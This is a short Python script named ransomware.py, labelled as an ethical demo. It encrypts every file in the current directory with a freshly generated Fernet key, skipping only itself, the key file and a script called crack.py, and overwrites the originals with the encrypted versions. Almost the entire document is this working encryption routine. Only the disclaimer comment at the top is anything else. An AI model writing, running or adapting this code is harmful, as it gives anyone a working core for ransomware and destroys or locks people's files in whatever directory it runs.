#For ransomware.py - Ethical demo only
# Do not run in production environments

import os
from cryptography.fernet import Fernet

# Collect files safely
files = []
for file in os.listdir():
    if file in ["ransomware.py", "secret.key","crack.py"]:
        continue
    if os.path.isfile(file):
        files.append(file)

print("Files to encrypt:", files)

# Generate and save key
key = Fernet.generate_key()
with open("secret.key", "wb") as key_file:
    key_file.write(key)

fernet = Fernet(key)

# Encrypt files
for file in files:
    with open(file, "rb") as f:
        data = f.read()
    encrypted = fernet.encrypt(data)
    with open(file, "wb") as f:
        f.write(encrypted)

print("Encryption complete. Keep secret.key safe!")
